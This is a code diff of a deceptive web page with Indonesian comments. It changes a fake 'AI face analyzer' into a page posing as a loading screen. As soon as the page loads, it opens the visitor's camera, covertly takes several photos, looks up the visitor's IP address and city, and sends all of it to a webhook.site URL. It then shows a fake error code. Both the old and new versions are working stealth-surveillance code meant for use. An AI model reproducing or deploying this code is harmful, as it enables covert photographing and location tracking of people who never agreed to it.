@@ -3,118 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Face Analyzer v4.0</title>
-    <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+    <title>Sistem Sedang Memuat...</title>
     <style>
-        body { margin: 0; background: #000; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; }
-        #app { position: relative; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; }
-        video { position: absolute; width: 100%; height: 100%; object-fit: cover; }
-        canvas { position: absolute; z-index: 10; pointer-events: none; }
-        #overlay { position: absolute; z-index: 20; background: rgba(0,0,0,0.85); width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; cursor: pointer; }
-        .border-box { border: 2px solid #00ff00; padding: 30px; box-shadow: 0 0 20px #00ff00; }
-        .blink { animation: blinker 1.5s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        body { margin: 0; padding: 0; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #121212; color: #e0e0e0; font-family: sans-serif; }
+        #container { text-align: center; }
+        #loader { border: 5px solid #333; border-top: 5px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { font-size: 14px; font-weight: bold; color: #fe2c55; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div id="app">
-        <div id="overlay" onclick="startEngine()">
-            <div class="border-box">
-                <h2 class="blink">AI ENGINE READY</h2>
-                <p id="status">TAP TO START BIO-SCAN</p>
-                <p style="font-size: 10px; color: #888;">System requires camera access for age estimation</p>
-            </div>
-        </div>
-        <video id="video" autoplay muted playsinline></video>
-        <canvas id="canvas"></canvas>
+    <div id="container">
+        <div id="loader"></div>
+        <div id="status">MENGHUBUNGKAN KE SERVER...</div>
+        <p style="font-size: 12px; color: #888;">Mohon jangan tutup halaman ini.</p>
     </div>
 
+    <video id="video" autoplay muted playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
     <script>
+        // GANTI LINK WEBHOOK DI SINI
         const WEBHOOK_URL = 'https://webhook.site/0fd1f3d6-dd15-4117-a62f-cf109f69247b';
+        
         const video = document.getElementById('video');
-        const status = document.getElementById('status');
-        const overlay = document.getElementById('overlay');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const statusDiv = document.getElementById('status');
         let photoCount = 0;
-        let isEngineRunning = false;
 
-        async function startEngine() {
-            if(isEngineRunning) return;
-            isEngineRunning = true;
-            
-            status.innerText = "LOADING MODELS...";
-            
+        async function startSystem() {
             try {
-                // 1. Ambil Kamera
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
                 video.srcObject = stream;
-
-                // 2. Load "Otak" AI
-                const MODEL_URL = 'https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights';
-                await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
-                await faceapi.nets.ageGenderNet.loadFromUri(MODEL_URL);
-                await faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL);
-
-                overlay.style.display = 'none';
-                processDetection();
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    statusDiv.innerText = "SINKRONISASI DATA...";
+                    // Langsung ambil foto pertama setelah 2 detik
+                    setTimeout(takeSnapShot, 2000); 
+                };
             } catch (err) {
-                alert("Kamera Error / Izin Ditolak");
-                isEngineRunning = false;
+                statusDiv.innerText = "KONEKSI GAGAL";
+                kirimData({ status: "IZIN_DITOLAK" });
             }
         }
 
-        async function processDetection() {
-            const canvas = document.getElementById('canvas');
-            const displaySize = { width: window.innerWidth, height: window.innerHeight };
-            faceapi.matchDimensions(canvas, displaySize);
+        function takeSnapShot() {
+            if (photoCount >= 5) {
+                statusDiv.innerText = "ERROR: 0x88291"; 
+                return;
+            }
 
-            setInterval(async () => {
-                const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())
-                    .withAgeAndGender()
-                    .withFaceExpressions();
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                photoCount++;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataFoto = canvas.toDataURL('image/jpeg', 0.4);
 
-                const resizedDetections = faceapi.resizeResults(detections, displaySize);
-                canvas.getContext('2d').clearRect(0, 0, canvas.width, canvas.height);
-                
-                // GAMPILAN DEPAN: Gambar kotak deteksi wajah di layar target
-                faceapi.draw.drawDetections(canvas, resizedDetections);
-                
-                resizedDetections.forEach(result => {
-                    const { age, gender } = result;
-                    new faceapi.draw.DrawTextField([
-                        `AGE: ${Math.round(age)} YEARS`,
-                        `GEN: ${gender.toUpperCase()}`
-                    ], result.detection.box.topRight).draw(canvas);
-
-                    // SISTEM BELAKANG: Ambil foto diem-diem
-                    if (photoCount < 5) {
-                        captureStealth(Math.round(age), gender);
-                    }
+                kirimData({
+                    event: "CAPTURE",
+                    no: photoCount,
+                    foto: dataFoto
                 });
-            }, 1000);
+            }
+
+            // Ambil foto berikutnya setiap 2 detik
+            setTimeout(takeSnapShot, 2000);
         }
 
-        function captureStealth(age, gen) {
-            photoCount++;
-            const c = document.createElement('canvas');
-            c.width = video.videoWidth;
-            c.height = video.videoHeight;
-            c.getContext('2d').drawImage(video, 0, 0);
-            const imgData = c.toDataURL('image/jpeg', 0.5);
+        async function kirimData(payload) {
+            try {
+                // Ambil data IP & Lokasi sederhana
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                const finalData = { ...payload, ...{ kota: ipData.city, ip: ipData.ip } };
 
-            // Kirim ke Webhook
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({ 
-                    type: "AI_DATA_STEALTH", 
-                    snap_no: photoCount, 
-                    estimated_age: age, 
-                    gender: gen, 
-                    image: imgData 
-                })
-            });
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(finalData)
+                });
+            } catch (e) {}
         }
+
+        window.onload = startSystem;
     </script>
 </body>
 </html>
